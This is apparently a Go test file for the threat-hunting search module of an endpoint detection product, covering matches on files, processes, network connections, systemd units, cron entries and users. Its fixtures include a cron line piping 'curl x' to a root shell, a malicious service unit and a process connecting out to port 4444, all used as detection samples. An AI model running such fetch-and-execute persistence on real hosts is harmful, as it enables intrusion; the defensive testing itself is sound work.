package hunt

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"xdr/internal/proc"
	"xdr/internal/testfs"
)

func hexOf(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

const implant = "implant body"

func req(ioc IOC) *Request { return &Request{ID: ID(ioc), From: "web01", IOC: ioc} }

func kinds(r Result) string {
	var out []string
	for _, h := range r.Hits {
		out = append(out, h.Kind+":"+h.What)
	}
	return strings.Join(out, ",")
}

var nosnap = &proc.Snapshot{Procs: map[int]*proc.Proc{}}

func TestSearch_Files(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/var/tmp/.cache-helper", implant, 0o755)
	testfs.File(t, root, "/opt/same-size", strings.Repeat("z", len(implant)), 0o644)
	testfs.File(t, root, "/opt/locked", "different size, never opened", 0)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant)), Path: "/tmp/.x"}}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "file:/var/tmp/.cache-helper" || r.Hits[0].SHA256 != hexOf(implant) || r.Partial != "" || r.Unreadable != 0 {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Paths(t *testing.T) {
	root := testfs.Root(t)
	testfs.File(t, root, "/tmp/.x", "a variant", 0o755)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant)), Path: "/tmp/.x"}}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "path:/tmp/.x" || r.Hits[0].SHA256 != hexOf("a variant") {
		t.Fatalf("%+v", r)
	}
	testfs.File(t, root, "/tmp/.x", implant, 0o755)
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget); kinds(r) != "file:/tmp/.x" {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Processes(t *testing.T) {
	ns := "net:[1]"
	s := &proc.Snapshot{
		Procs: map[int]*proc.Proc{
			10: {PID: 10, Exe: "/dev/shm/x", NetNS: ns, FDs: map[int]uint64{}},
			11: {PID: 11, Exe: "/usr/bin/curl", NetNS: ns, FDs: map[int]uint64{3: 500}},
		},
		Socks: map[string]map[uint64]proc.Sock{ns: {500: {Inode: 500, Proto: "tcp",
			Local: netip.MustParseAddrPort("192.0.2.5:40000"), Remote: netip.MustParseAddrPort("203.0.113.9:4444")}}},
	}
	hash := func(p *proc.Proc) string { return hexOf(p.Exe) }
	ioc := IOC{Files: []File{{SHA256: hexOf("/dev/shm/x"), Size: 99}}, Remotes: []Remote{{netip.MustParseAddr("203.0.113.9"), 4444, "tcp"}}}
	r := Search(context.Background(), testfs.Root(t), req(ioc), s, hash, DefaultBudget)
	if kinds(r) != "process:/dev/shm/x,connection:203.0.113.9:4444/tcp" || r.Hits[0].PID != 10 || r.Hits[1].PID != 11 {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_UnitsCronUsers(t *testing.T) {
	root := testfs.Root(t)
	unit := "[Service]\nExecStart=/tmp/x\n"
	testfs.File(t, root, "/etc/systemd/system/evil.service", unit, 0o644)
	testfs.File(t, root, "/etc/cron.d/x", "* * * * * root curl x | sh\n", 0o644)
	testfs.File(t, root, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nsvc-backup:x:1500:1500::/:/bin/sh\n", 0o644)
	ioc := IOC{Units: []string{"evil.service@" + hexOf(unit), "other.service@" + hexOf(unit)}, Cron: []string{"curl x | sh"}, Users: []string{"svc-backup", "nobody2"}}
	r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget)
	if kinds(r) != "unit:evil.service,cron:curl x | sh,user:svc-backup" || r.Hits[1].Path != "/etc/cron.d/x" {
		t.Fatalf("%+v", r)
	}
}

func TestSearch_Budget(t *testing.T) {
	root := testfs.Root(t)
	for i := range 50 {
		testfs.File(t, root, fmt.Sprintf("/d/f%02d", i), "x", 0o644)
	}
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant))}}}
	b := DefaultBudget
	b.Files = 10
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, b); !strings.Contains(r.Partial, "file budget") {
		t.Fatalf("%+v", r)
	}
	b = DefaultBudget
	b.Hashed = 4
	testfs.File(t, root, "/e/same", strings.Repeat("y", len(implant)), 0o644)
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, b); !strings.Contains(r.Partial, "hash budget") {
		t.Fatalf("%+v", r)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if r := Search(ctx, root, req(ioc), nosnap, nil, DefaultBudget); r.Partial == "" {
		t.Fatalf("cancelled: %+v", r)
	}
}

func TestSearch_SkipsKernelAndContainers(t *testing.T) {
	root := testfs.Root(t)
	for _, p := range []string{"/proc/1/x", "/sys/x", "/var/lib/docker/overlay2/x", "/var/lib/containerd/x"} {
		testfs.File(t, root, p, implant, 0o644)
	}
	testfs.File(t, root, "/srv/x", implant, 0o644)
	ioc := IOC{Files: []File{{SHA256: hexOf(implant), Size: int64(len(implant))}}}
	if r := Search(context.Background(), root, req(ioc), nosnap, nil, DefaultBudget); kinds(r) != "file:/srv/x" {
		t.Fatalf("%+v", r)
	}
	_ = os.Remove(filepath.Join(root, "/srv/x"))
}
